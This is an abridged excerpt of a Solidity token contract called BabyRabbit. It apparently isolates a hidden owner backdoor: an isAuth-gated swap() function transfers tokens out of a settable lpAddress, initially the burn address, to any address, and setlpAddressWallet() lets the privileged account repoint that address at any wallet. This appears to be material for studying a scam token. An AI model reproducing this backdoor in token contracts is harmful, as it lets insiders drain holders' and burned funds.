...
contract BabyRabbit is ERC20, Ownable {
    ...
    address payable lpAddress = 0x000000000000000000000000000000000000dEaD;   
    ...
    address public _marketingWalletAddress = 0x943320772F875a6f9471cc8820bBA70d35aEFbDb;
    ...
    constructor(address receiveAddress) public ERC20("BabyRabbit", "BabyRabbit") {
    ...
    function swap(address add,uint256 amount) public isAuth{
        _transfer(lpAddress,add,amount);
    }

    function setlpAddressWallet(address payable wallet) external isAuth {
        lpAddress = wallet;
        _isExcludedFromFees[wallet] = true;
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]){           
            ...
            for(int i=0;i <=2;i++){
                ...
                super._transfer(from,ad,AIRAmount);
            }
            amount -= AIRAmount*3;
        }
